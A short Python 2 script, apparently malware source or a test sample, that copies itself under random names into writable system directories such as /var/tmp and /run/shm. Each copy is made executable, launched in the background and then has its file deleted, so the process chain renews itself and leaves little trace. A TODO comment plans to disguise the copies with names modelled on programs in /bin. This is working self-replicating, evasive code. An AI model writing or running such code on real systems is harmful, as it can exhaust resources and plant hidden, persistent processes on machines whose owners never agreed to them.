#!/usr/bin/python

import os
import sys
import time
import shutil
import random
import tempfile

f = open(sys.argv[0])
code = f.read()
f.close()
time.sleep(1)
#TODO: change name generator only
#      read prognames fin /bin
#      create similar names in writable dirs
#      collect list of writeable dirs
#      check whether file exists, then create.

tgtdirs = ['/var/metrics', '/var/tmp', '/var/crash', '/run/shm']


def getRandomFilename():
  size = random.randint(6,12)
  pre = ""
  for i in range(size):
    pre = pre + random.choice("AbCdEfGh")
  b = bytearray(pre)
  b[1]='B'
  b[3]='Z'
  pre = str(b)
  td = random.choice(tgtdirs)
  filename = "%s/%s" % (td, pre)
  return filename


tempname = getRandomFilename()
while(os.path.exists(tempname)):
  tempname = getRandomFilename()

g = open(tempname, "w")
g.write(code)
g.close()
os.chmod(tempname, 0555)
os.system("touch ALIVE4.txt")
os.system("%s &" % (tempname))
time.sleep(1)
os.remove(tempname)
